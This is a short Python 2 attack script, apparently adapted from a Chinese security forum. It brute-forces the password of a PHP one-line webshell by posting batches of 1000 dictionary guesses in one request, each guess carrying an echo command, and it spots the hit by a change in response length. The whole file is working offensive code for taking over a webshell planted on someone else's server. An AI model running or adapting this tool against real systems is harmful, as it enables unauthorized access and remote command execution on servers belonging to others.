# -*- coding: UTF-8 -*-
# coding by v5est0r
# code from ichunqiu edited by AresX
# 单次多变量提交变量方式,一句话爆破提速千倍

import requests

def crack(shellurl):
    pass_dic = 'auxi/pwd.txt'
    post_data = {}  # 创建字典集
    s = open(pass_dic,'r')
    content = s.readlines()  # 分行读取字典
    dics = len(content) / 1000
    print 'The number of dictionaries is: %s' % str(len(content))
    print "The dictionary will be divided into %s parts" % str(dics)
    group = []  # 字典每行独立化,写入元组
    for h in range(0,len(content)):
        password = str(content[h]).strip('\n')  # 剔除换行符
        group.append(password)
    # print group
    shell = shellurl
    post_test = {'test_pass_test':'echo "test!!";'}
    res = requests.post(shell,data = post_test)
    wrong_res = res.text
    post_test.clear()
    for i in range(0,dics):
        new_group = []
        for k in range(i * 1000,(i + 1) * 1000):
            new_group.append(group[k])
            k += 1
        for each in new_group:
            post_data[each] = 'echo "password is %s";' % each
        r = requests.post(shell,data = post_data)
        print "cracking part %s " % str(i + 1)
        post_data.clear()
        i += 1
        print r.text
        if len(r.text) != len(wrong_res):
            break

    new_group1 = []
    for kk in range(dics * 1000,len(content)):
        new_group1.append(group[kk])
        kk += 1
    for each in new_group1:
        post_data[each] = 'echo "password is %s";' % each
    r = requests.post(shell,data = post_data)
    print "cracking remainder part "
    print r.text
